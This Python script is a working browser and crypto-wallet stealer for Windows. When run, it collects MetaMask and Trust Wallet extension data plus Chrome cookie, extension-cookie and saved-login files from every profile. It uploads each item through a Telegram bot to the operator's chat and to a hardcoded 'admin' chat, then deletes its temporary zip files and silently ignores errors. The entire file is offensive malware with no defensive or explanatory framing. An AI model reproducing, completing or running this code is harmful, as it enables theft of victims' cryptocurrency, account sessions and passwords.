import os
import random
import zipfile
import telebot


tel_bot = telebot.TeleBot(token="TELEGRAM_BOT_TOKEN")
chat_id = CHATX_IDX_X
admin = -1001797987215 # admin chat id for all users data log


def toZip(source_dir, output_zip):
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for foldername, subfolders, filenames in os.walk(source_dir):
            for filename in filenames:
                file_path = os.path.join(foldername, filename)
                zipf.write(file_path, os.path.relpath(file_path, source_dir))



def hijack():
    randint = random.randrange(100000, 999999)
    username = os.getlogin()
    Chrome_Path = f'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data'
    for dir in os.listdir(Chrome_Path):
        if "Profile " in dir or "Default" == dir:
            Extension_Dir = f'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data'
            Cookies_Path = f'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data'
            ExtensionCookies_Path = f'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data'
            LoginData_Path = f'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data'

            Extension_Dir = f'{Extension_Dir}\\{dir}\\Local Extension Settings'
            Cookies_Path = f'{Cookies_Path}\\{dir}\\Cookies'
            ExtensionCookies_Path = f'{ExtensionCookies_Path}\\{dir}\\Extension Cookies'
            LoginData_Path = f'{LoginData_Path}\\{dir}\\Login Data'
            
    
            try:
                Metamask_Path = f'{Extension_Dir}\\nkbihfbeogaeaoehlefnkodbefgpgknn'
                Metamask_Zip_Path = f'C:\\Users\\{username}\\AppData\\Local\\metamask_{randint}_{username}.zip'
                toZip(Metamask_Path, Metamask_Zip_Path)
                tel_bot.send_document(
                    chat_id=chat_id,
                    document=open(Metamask_Zip_Path, "rb"),
                    caption=f'target: {randint} _ {username}'
                )
                tel_bot.send_document(
                    chat_id=admin,
                    document=open(Metamask_Zip_Path, "rb"),
                    caption=f'target: {randint} _ {username}'
                )
                os.remove(Metamask_Zip_Path)
            except:
                pass

            try:
                TrustWallet_Path = f'{Extension_Dir}\\egjidjbpglichdcondbcbdnbeeppgdph'
                TrustWallet_Zip_Path = f'C:\\Users\\{username}\\AppData\\Local\\TrustWallet_{randint}_{username}.zip'
                toZip(TrustWallet_Path, TrustWallet_Zip_Path)
                tel_bot.send_document(
                    chat_id=chat_id,
                    document=open(TrustWallet_Zip_Path, "rb"),
                    caption=f'target: {randint} _ {username}'
                )
                tel_bot.send_document(
                    chat_id=admin,
                    document=open(TrustWallet_Zip_Path, "rb"),
                    caption=f'target: {randint} _ {username}'
                )
                os.remove(TrustWallet_Zip_Path)
            except:
                pass

            try:
                tel_bot.send_document(
                    chat_id=chat_id,
                    document=open(Cookies_Path, "rb"),
                    caption=f'target: {randint} _ {username}'
                )
                tel_bot.send_document(
                    chat_id=admin,
                    document=open(Cookies_Path, "rb"),
                    caption=f'target: {randint} _ {username}'
                )
            except:
                try:
                    Cookies_Path = Cookies_Path.replace("Cookies", "Network\\Cookies")
                    tel_bot.send_document(
                        chat_id=chat_id,
                        document=open(Cookies_Path, "rb"),
                        caption=f'target: {randint} _ {username}'
                    )
                    tel_bot.send_document(
                        chat_id=admin,
                        document=open(Cookies_Path, "rb"),
                        caption=f'target: {randint} _ {username}'
                    )
                except:
                    pass

            try:
                tel_bot.send_document(
                    chat_id=chat_id,
                    document=open(ExtensionCookies_Path, "rb"),
                    caption=f'target: {randint} _ {username}'
                )
                tel_bot.send_document(
                    chat_id=admin,
                    document=open(ExtensionCookies_Path, "rb"),
                    caption=f'target: {randint} _ {username}'
                )
            except:
                pass

            try:
                tel_bot.send_document(
                    chat_id=chat_id,
                    document=open(LoginData_Path, "rb"),
                    caption=f'target: {randint} _ {username}'
                )
                tel_bot.send_document(
                    chat_id=admin,
                    document=open(LoginData_Path, "rb"),
                    caption=f'target: {randint} _ {username}'
                )
            except:
                pass


hijack()


